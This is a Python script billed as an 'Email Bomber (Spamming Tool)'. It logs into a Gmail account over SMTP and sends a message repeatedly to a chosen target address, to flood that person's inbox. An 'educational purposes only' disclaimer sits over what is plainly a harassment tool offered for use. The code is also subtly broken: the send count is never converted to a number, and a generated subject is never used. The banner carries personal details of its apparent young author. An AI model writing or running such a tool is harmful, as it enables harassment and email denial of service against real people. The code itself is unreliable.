#!/usr/bin/python 3.9
#E-bomber
#This code for education purpose only.
#Use it at your own risk !!!
# Python 3 rewrite by Omicron166


import os
import smtplib
import getpass
import sys
import time


print ('                                                                    ')
print ('                                                                    ')
print ('            #################################################       ')
print ('            #                                               #       ')
print ('            #        Email Bomber ( Spamming Tool )         #       ')
print ('            #                                               #       ')
print ('            #                  Version 2.0                  #       ')
print ('            #                                               #       ')
print ('            #           Modified by : GAUTAM KUMAR SINGH    #       ')
print ('            #                                               #       ')
print ('            #            USER NAME : MRX                    #       ')
print ('            #                                               #       ')
print ('            #       Only for Educational Purposes !!        #       ')
print ('            #                                               #       ')
print ('            #################################################       ')

print ('                                                                   ')


print ('                                           ')


print ('            MRX                                                 ')  
print ('')
print ('')
print ('')
print ('            GAUTAM KUMAR SINGH                                  ')
print ('')
print ('')
print ('')
print ('            BIRTHDAY 19/2/2009                                  ')
print ('')
print ('')
print ('')
print ('           JOIN DISCODE ; https://discord.gg/xx2Vh9x8XV         ')
print ('')
print ('')
print ('')


print ('    ')
email = input('Attacker Gmail Address : ')
print ('             ')
user = input('Anonymous name : ')
print ('      ')
passwd = getpass.getpass('Password: ')

print ('   ')

to = input('\nTo: ')


print ('    ')

body = input('Message: ')

print ('    ')

total = input('Number of send: ')

smtp_server = 'smtp.gmail.com'
port = 587


print ('')

try:
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    server.starttls()
    server.login(email, passwd)
    for i in range(1, total + 1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
        server.sendmail(email, to, msg)
        print ("\rE-mails sent: %i" % i)
        time.sleep(1)
        sys.stdout.flush()
    server.quit()
    print ('\n Done !!!')
except KeyboardInterrupt:
    print ('[-] Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print ('\n[!] The username or password you entered is incorrect.')
    sys.exit()
